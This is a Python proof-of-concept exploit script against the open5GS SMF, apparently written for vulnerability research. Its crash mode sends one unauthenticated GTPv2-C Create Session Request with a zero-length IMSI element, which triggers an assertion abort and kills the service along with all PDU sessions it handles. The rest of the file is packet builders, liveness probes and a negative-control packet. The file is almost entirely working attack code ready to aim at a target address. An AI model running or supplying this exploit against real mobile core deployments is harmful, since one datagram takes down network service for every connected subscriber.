#!/usr/bin/env python3
"""
smf_gtpc_zerolen_imsi_poc.py -- open5GS SMF: one unauthenticated 34-octet GTPv2-C
Create Session Request carrying a zero-length IMSI IE aborts the SMF.
smf_sess_add_by_gtp2_message() validates the IMSI Information Element by presence
only, so an IMSI IE encoded as type 1 / length 0x0000 passes that check, and the
attacker-controlled wire length (0) is then handed to smf_ue_find_by_imsi(), where
ogs_assert(imsi_len) fires. ogs_assert() is never compiled out in open5GS, so the
process calls abort() (SIGABRT, container exit 134) and every PDU session it serves
is lost. The control payload is identical except the IMSI IE carries 8 octets of
BCD, which the SMF handles gracefully.

Usage:
    python3 smf_gtpc_zerolen_imsi_poc.py --target 172.22.0.7 --mode echo      # liveness oracle only
    python3 smf_gtpc_zerolen_imsi_poc.py --target 172.22.0.7 --mode control   # negative control, must NOT crash
    python3 smf_gtpc_zerolen_imsi_poc.py --target 172.22.0.7 --mode crash     # the attack

Exit codes: 0 = predicted outcome (crash: SMF dead; control/echo: SMF alive),
1 = crash payload did not kill the SMF, 2 = precondition failure (no Echo Response).
"""

import argparse
import socket
import sys
import time

# GTPv2-C message types (lib/gtp/v2/types.h)
GTP2_ECHO_REQUEST = 0x01
GTP2_ECHO_RESPONSE = 0x02
GTP2_CREATE_SESSION_REQUEST = 0x20
GTP2_CREATE_SESSION_RESPONSE = 0x21

# IE types (open5GS wire format: 1-byte type + 2-byte length + 1-byte instance)
IE_IMSI = 0x01
IE_RECOVERY = 0x03
IE_APN = 0x47
IE_RAT_TYPE = 0x52


def ie(ie_type: int, value: bytes, instance: int = 0) -> bytes:
    """One open5GS-style GTPv2 IE: type(1) length(2) instance(1) value."""
    return bytes([ie_type]) + len(value).to_bytes(2, "big") + bytes([instance]) + value


def apn_fqdn(apn: str) -> bytes:
    """APN value in open5GS FQDN encoding: one length byte per label."""
    out = b""
    for label in apn.split("."):
        out += bytes([len(label)]) + label.encode()
    return out


def gtp2(msg_type: int, payload: bytes, teid: int = 0, seq: int = 1) -> bytes:
    """GTPv2-C header: flags(1) type(1) length(2) TEID(4) seq(3) spare(1)."""
    flags = 0x48  # version 2, TEID field present
    length = 8 + len(payload)  # TEID + seq + spare + payload
    return (bytes([flags, msg_type]) + length.to_bytes(2, "big") +
            teid.to_bytes(4, "big") + seq.to_bytes(3, "big") + b"\x00" + payload)


def create_session_zero_imsi(apn: str = "internet", rat: int = 6, seq: int = 1) -> bytes:
    """The exploit: IMSI IE present but zero-length, plus the two other IEs that
    smf_sess_add_by_gtp2_message() checks for presence first."""
    ies = ie(IE_IMSI, b"") + ie(IE_RAT_TYPE, bytes([rat])) + ie(IE_APN, apn_fqdn(apn))
    return gtp2(GTP2_CREATE_SESSION_REQUEST, ies, teid=0, seq=seq)


def create_session_control_imsi(imsi_bcd: bytes = bytes.fromhex("00101012345678f7"),
                                apn: str = "internet", rat: int = 6, seq: int = 1) -> bytes:
    """Negative control: identical shape, well-formed 8-octet BCD IMSI."""
    ies = ie(IE_IMSI, imsi_bcd) + ie(IE_RAT_TYPE, bytes([rat])) + ie(IE_APN, apn_fqdn(apn))
    return gtp2(GTP2_CREATE_SESSION_REQUEST, ies, teid=0, seq=seq)


def echo_request(seq: int = 1) -> bytes:
    return gtp2(GTP2_ECHO_REQUEST, ie(IE_RECOVERY, b"\x00"), teid=0, seq=seq)


def probe_alive(target: str, port: int, attempts: int = 3, timeout: float = 2.0):
    """Liveness = the SMF answers a GTPv2-C Echo Request with an Echo Response."""
    for i in range(attempts):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        try:
            s.sendto(echo_request(seq=i + 1), (target, port))
            data, _ = s.recvfrom(2048)
            if len(data) >= 2 and data[1] == GTP2_ECHO_RESPONSE:
                return True, "Echo Response received"
        except socket.timeout:
            pass
        finally:
            s.close()
        if i < attempts - 1:
            time.sleep(2.0)
    return False, "no Echo Response"


def send_and_wait(target: str, port: int, pkt: bytes, timeout: float = 2.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(pkt, (target, port))
        return s.recvfrom(2048)[0]
    except socket.timeout:
        return None
    finally:
        s.close()


def main() -> int:
    p = argparse.ArgumentParser(
        description="open5GS SMF zero-length GTPv2-C IMSI IE -> ogs_assert(imsi_len) abort")
    p.add_argument("--target", required=True, help="SMF GTP-C address")
    p.add_argument("--port", type=int, default=2123, help="GTP-C port (default 2123)")
    p.add_argument("--mode", choices=["echo", "control", "crash"], default="crash")
    p.add_argument("--apn", default="internet")
    p.add_argument("--timeout", type=float, default=2.0)
    p.add_argument("--settle", type=float, default=2.0,
                   help="seconds to wait after the shot before re-probing liveness")
    args = p.parse_args()

    alive, detail = probe_alive(args.target, args.port, timeout=args.timeout)
    print(f"[*] pre-shot liveness: alive={alive}  ({detail})")
    if not alive:
        print("[!] precondition failed: target does not answer GTPv2-C Echo")
        return 2

    if args.mode == "echo":
        return 0

    if args.mode == "control":
        resp = send_and_wait(args.target, args.port,
                             create_session_control_imsi(apn=args.apn), args.timeout)
        print(f"[*] control Create Session Response: {resp.hex() if resp else '<none>'}")
        alive, detail = probe_alive(args.target, args.port, timeout=args.timeout)
        print(f"[*] post-control liveness: alive={alive}  ({detail})")
        print("[*] VERDICT: " + ("CONTROL PASSED -- SMF alive" if alive
                                 else "CONTROL FAILED -- SMF died"))
        return 0 if alive else 1

    # crash mode
    shot = create_session_zero_imsi(apn=args.apn)
    print(f"[*] firing {len(shot)}-octet Create Session Request with zero-length IMSI IE")
    send_and_wait(args.target, args.port, shot, args.timeout)
    time.sleep(args.settle)

    alive, detail = probe_alive(args.target, args.port, timeout=args.timeout)
    print(f"[*] post-shot liveness: alive={alive}  ({detail})")
    if alive:
        print("[*] VERDICT: SMF SURVIVED -- not reproduced")
        return 1
    print("[*] VERDICT: SMF NO LONGER ANSWERS GTPv2-C Echo Request -- killed by one datagram")
    return 0


if __name__ == "__main__":
    sys.exit(main())
